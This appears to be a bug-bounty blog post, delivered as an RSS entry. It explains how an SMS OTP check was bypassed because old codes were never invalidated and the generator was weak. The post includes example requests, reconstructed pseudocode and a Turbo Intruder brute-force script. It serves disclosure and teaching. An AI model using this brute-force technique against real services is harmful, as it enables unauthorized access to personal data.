@@ -1,0 +1,196 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CSPRNG on yso infosec blog</title><link>https://blog.ys0.dev/tags/csprng/</link><description>Recent content in CSPRNG on yso infosec blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 04 Feb 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ys0.dev/tags/csprng/index.xml" rel="self" type="application/rss+xml"/><item><title>Bypassing SMS OTP Authentication or a story behind $16.5k in bounties</title><link>https://blog.ys0.dev/p/playing-with-sms-otps/</link><pubDate>Tue, 04 Feb 2025 00:00:00 +0000</pubDate><guid>https://blog.ys0.dev/p/playing-with-sms-otps/</guid><description>&lt;img src="https://blog.ys0.dev/p/playing-with-sms-otps/cover.jpeg" alt="Featured image of post Bypassing SMS OTP Authentication or a story behind $16.5k in bounties" />&lt;p>It&amp;rsquo;s common to see SMS OTPs used for authentication, but bypassing them is not always trivial. In this post, we&amp;rsquo;ll explore such an exploitation scenario by reverse engineering a black-box functionality, applying probability theory and analyzing entropy.&lt;/p>
+&lt;p>This is my first blog post ever, so I&amp;rsquo;d appreciate any feedback via any channel you find appropriate.&lt;/p>
+&lt;h2 id="prologue">Prologue
+&lt;/h2>&lt;p>I discovered a simple PII disclosure vulnerability on an endpoint that returned customer data based on a provided phone number. The customer data included name, surname, email, phone number, full location, birth date, nationality, ID card or passport number.&lt;/p>
+&lt;p>Example request:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/retrieve-customer-data&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">redacted.example.com&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="g">phonenumber=9999999
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blog.ys0.dev/p/playing-with-sms-otps/result.png"
+width="1558"
+height="973"
+loading="lazy"
+alt="Example of the leaked data"
+class="gallery-image"
+data-flex-grow="160"
+data-flex-basis="384px"
+>&lt;/p>
+&lt;p>The functionality was only there to autofill user forms. The team initially patched an issue straightforwardly by returning only a boolean value whether or not the phone number exists in the database, which I verified.&lt;/p>
+&lt;p>However, three days later, developers reintroduced this feature with an additional security layer: requiring a user to provide an SMS OTP in order to retrieve data related to the phone number.&lt;/p>
+&lt;p>Sounds to be secure, but &amp;hellip;&lt;/p>
+&lt;h2 id="exploiting-weak-sms-otp-implementations">Exploiting Weak SMS OTP Implementations
+&lt;/h2>&lt;p>Now, retrieving data required the following two requests: first requesting an OTP, then entering a 4-digit random OTP to retrieve the same data as before.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/request-otp&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">redacted.example.com&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="g">phonenumber=9999999
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/retrieve-customer-data&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">redacted.example.com&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="g">phonenumber=9999999&amp;amp;otp=1111
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The first things I thought about and tested were:&lt;/p>
+&lt;ul>
+&lt;li>Not sending an OTP&lt;/li>
+&lt;li>Sending a &lt;code>null&lt;/code> OTP&lt;/li>
+&lt;li>Sending &lt;code>0000&lt;/code> OTP&lt;/li>
+&lt;li>Sending an OTP in different data types like arrays&lt;/li>
+&lt;li>Including both a body and query parameter for OTP&lt;/li>
+&lt;li>Changing request method&lt;/li>
+&lt;li>Changing content types and trying again with different data types&lt;/li>
+&lt;li>Attempting to retrieve data without requesting an OTP&lt;/li>
+&lt;/ul>
+&lt;p>Eventually, I tested how many attempts we have before the OTP is invalidated by simply trying first sending one wrong request and then a right OTP, then two, then three wrong requests, and then I understood that the OTP is invalided on the 4th request to &lt;code>/retrieve-customer-data&lt;/code>.&lt;/p>
+&lt;p>At this stage, guessing OTPs with a probability of 0.3% is already great, but can we do better?&lt;/p>
+&lt;p>Sure, while looking for a way to reset a counter of failed attempts, I have found that one can do this by requesting a new SMS message, which generates a new OTP, thus giving us three more attempts. In fact, we can only send 50 SMS messages for a phone number. Now, the setup is much better.&lt;/p>
+&lt;p>If you take a look at a pseudo code I reverse-engineered for this feature, you probably might notice a problem.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">fail_count_map&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1">## 9999999 -&amp;gt; int&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phone_to_otp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1">## 9999999 -&amp;gt; list(int)/set(int)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phone_to_max_sms&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1">## 9999999 -&amp;gt; int&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">send_sms&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">phone_to_max_sms&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">429&lt;/span>&lt;span class="n">_TO_MANY_SMS_MESSAGES_SENT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">OTP&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">generate_and_send_SMS_OTP&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">phone_to_otp&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">OTP&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fail_count_map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">phone_to_max_sms&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">phone_to_max_sms&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">get_data&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">otp&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">otp&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">phone_to_otp&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">GET_USER_DATA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fail_count_map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fail_count_map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">fail_count_map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># CLEAR OTPS&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>If you indeed noticed - congrats; if not, take a look at lines 2 and 15 - indeed SMS messages are not invalidated once we send a new one, they are simply kept in a structure similar to a set or list, thus each time we exceed our three &lt;code>/retrieve-customer-data&lt;/code> requests and send a new &lt;code>/request-otp&lt;/code> request we double our chances for the next three guesses.&lt;/p>
+&lt;p>For example:&lt;/p>
+&lt;ul>
+&lt;li>First 3 guesses with probabilities of 1/10000, 1/9999, 1/9998&lt;/li>
+&lt;li>Next 3 guesses with probabilities of 2/9997, 2/9996, 2/9995&lt;/li>
+&lt;li>Next 3 guesses with probabilities of 3/9994, 3/9993, 3/9992&lt;/li>
+&lt;/ul>
+&lt;p>After 50 OTP requests, the success rate reached ~&lt;strong>32%&lt;/strong>.&lt;/p>
+&lt;p>Finally, a cherry on top - while testing, I accumulated a few thousand SMS messages, did a simple distribution fitting and found that the most frequent group was 7000-7150. For the PoC, I chose to guess this range and wrote the following Turbo Intruder script.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">send_sms = &amp;#34;&amp;#34;&amp;#34;here goes your HTTP request&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">def queueRequests(target, wordlists):
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> engine = RequestEngine(endpoint=target.endpoint,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> concurrentConnections=5,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> requestsPerConnection=100,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pipeline=False
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> )
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> code = 7000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> for i in range(50):
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> engine.queue(send_sms)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> time.sleep(2.0)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> for k in range(3):
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> engine.queue(target.req, str(code))
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> code += 1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">def handleResponse(req, interesting):
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> if req.status != 404:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> table.add(req)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The PoC worked 5 out of 5 times, which led to a conclusion that they might be using a non-cryptographically secure PRNG. It was just an educated guess, but later, the company confirmed that their provider used a non-cryptographically secure PRNG.&lt;/p>
+&lt;h2 id="conclusion">Conclusion
+&lt;/h2>&lt;p>Apart from basic takeaways such as checking for not invalidated OTPs or brainstorming and checking ideas, the following stood out for me:&lt;/p>
+&lt;ul>
+&lt;li>Block time somewhere in the future to verify fixes and find bypasses, even if the fix was confirmed&lt;/li>
+&lt;li>Try to &amp;ldquo;reverse engineer&amp;rdquo; the logic behind it and write it in code more often. I found it to be helpful to brainstorm further ideas.&lt;/li>
+&lt;li>Don&amp;rsquo;t forget about non-cryptographically secure PRNGs and check them more often. (distribution fitting, etc.)&lt;/li>
+&lt;/ul>
+&lt;h2 id="timeline">Timeline
+&lt;/h2>&lt;ul>
+&lt;li>Overall, less than 12 hours of work were spent on this issue, including reporting and communication with the team.&lt;/li>
+&lt;li>11.11.2024 - First issue reported&lt;/li>
+&lt;li>11.11.2024 - First issue fixed&lt;/li>
+&lt;li>11.11.2024 - Fix verified&lt;/li>
+&lt;li>22.11.2024 - ~11000$ bounty paid&lt;/li>
+&lt;li>29.11.2024 - Second issue reported&lt;/li>
+&lt;li>03.12.2024 - OTP Invalidation issue fixed&lt;/li>
+&lt;li>17.12.2024 - PRNG issue fixed&lt;/li>
+&lt;li>16.01.2025 - Fix confirmed&lt;/li>
+&lt;li>23.01.2025 - ~5500$ bounty paid&lt;/li>
+&lt;/ul></description></item></channel></rss>
